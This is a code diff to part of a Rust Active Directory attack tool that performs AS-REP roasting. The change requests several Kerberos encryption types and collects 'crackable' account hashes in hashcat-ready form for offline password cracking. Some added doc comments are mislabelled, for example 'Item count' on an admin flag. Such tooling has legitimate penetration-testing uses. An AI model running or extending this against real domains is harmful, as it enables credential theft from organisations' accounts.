@@ -30,7 +30,7 @@ const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
 // ═══════════════════════════════════════════════════════════
 // Configuration
 // ═══════════════════════════════════════════════════════════
-
+/// Structure
 #[derive(Debug, Clone)]
 pub struct AsRepRoastConfig {
     /// Specific usernames to target (skip LDAP enumeration if provided)
@@ -39,8 +39,9 @@ pub struct AsRepRoastConfig {
     pub skip_disabled: bool,
     /// Output file for hashes (one per line, hashcat-ready)
     pub output_file: Option<PathBuf>,
-    /// Request with specific etype (default: RC4)
-    pub preferred_etype: Option<i32>,
+    /// Specific etypes to request (default: RC4, AES256, AES128).
+    /// Cross-forest: set to include the target domain's salt-derived AES key.
+    pub target_etypes: Vec<i32>,
     /// Filter: only target users in specific OUs
     pub target_ous: Vec<String>,
 }
@@ -51,7 +52,11 @@ impl Default for AsRepRoastConfig {
             target_users: Vec::new(),
             skip_disabled: true,
             output_file: None,
-            preferred_etype: None,
+            target_etypes: vec![
+                kerberos::ETYPE_RC4_HMAC,
+                kerberos::ETYPE_AES256_CTS,
+                kerberos::ETYPE_AES128_CTS,
+            ],
             target_ous: Vec::new(),
         }
     }
@@ -60,7 +65,7 @@ impl Default for AsRepRoastConfig {
 // ═══════════════════════════════════════════════════════════
 // Result
 // ═══════════════════════════════════════════════════════════
-
+/// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct AsRepRoastResult {
     /// Crackable hashes obtained
@@ -72,15 +77,22 @@ pub struct AsRepRoastResult {
     /// Users that failed for other reasons
     pub errors: Vec<(String, String)>,
 }
-
+/// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct RoastedAccount {
+    /// Username for authentication
     pub username: String,
+    /// Domain FQDN
     pub domain: String,
+    /// Classification for this object.
     pub etype: i32,
+    /// Hash value
     pub hash_string: String,
+    /// Object or account name.
     pub distinguished_name: Option<String>,
+    /// description field
     pub description: Option<String>,
+    /// Item count
     pub admin_count: bool,
 }
 
@@ -147,8 +159,9 @@ async fn roast_single(
     dc_ip: &str,
     domain: &str,
     username: &str,
+    etypes: &[i32],
 ) -> std::result::Result<CrackableHash, (String, String)> {
-    match kerberos::asrep_roast(dc_ip, domain, username).await {
+    match kerberos::asrep_roast_with_etypes(dc_ip, domain, username, etypes).await {
         Ok(hash) => Ok(hash),
         Err(e) => {
             let err_str = e.to_string();
@@ -206,7 +219,10 @@ pub async fn run(config: &HuntConfig, ac: &AsRepRoastConfig) -> Result<AsRepRoas
     pb.set_style(
         ProgressStyle::default_bar()
             .template("{spinner:.yellow} [{bar:40.magenta/dim}] {pos}/{len} AS-REP roasting {msg}")
-            .unwrap()
+            .unwrap_or_else(|e| {
+                warn!("Progress bar template error: {e}");
+                ProgressStyle::default_bar()
+            })
             .progress_chars("█▓░"),
     );
 
@@ -217,16 +233,9 @@ pub async fn run(config: &HuntConfig, ac: &AsRepRoastConfig) -> Result<AsRepRoas
     for (username, dn, desc, admin_count) in &targets {
         pb.set_message(username.clone());
 
-        match roast_single(&config.dc_ip, &config.domain, username).await {
+        match roast_single(&config.dc_ip, &config.domain, username, &ac.target_etypes).await {
             Ok(crackable) => {
-                // Parse the actual etype from the hash string format:
-                // $krb5asrep$<etype>$user@realm:<checksum>$<edata>
-                let etype = crackable
-                    .hash_string
-                    .strip_prefix("$krb5asrep$")
-                    .and_then(|s| s.split('$').next())
-                    .and_then(|e| e.parse::<i32>().ok())
-                    .unwrap_or(kerberos::ETYPE_RC4_HMAC);
+                let etype = crackable.etype;
                 let roasted = RoastedAccount {
                     username: crackable.username.clone(),
                     domain: crackable.domain.clone(),
